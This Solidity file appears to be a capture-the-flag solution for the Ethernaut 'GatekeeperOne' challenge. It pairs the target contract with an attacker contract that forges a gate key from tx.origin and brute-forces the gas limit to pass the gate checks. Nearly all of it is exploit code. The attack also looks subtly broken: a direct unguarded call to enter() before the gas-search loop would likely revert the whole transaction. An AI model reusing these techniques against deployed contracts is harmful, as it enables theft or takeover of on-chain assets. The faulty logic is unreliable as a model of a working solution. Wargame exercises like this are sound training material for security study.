// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttacker {
    
    // 대상 컨트랙트 주소
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        bytes8 fullkey = bytes8(k64);

        GatekeeperOne(target).enter(bytes8(fullkey));

        for (uint256 i = 0; i < 8191 ; i++){
            (bool success, ) = address(target).call{gas: i + (8191 * 1)}(abi.encodeWithSignature("enter(bytes8)", fullkey));

            if (success) {
                break;
            }
        }
    }
}
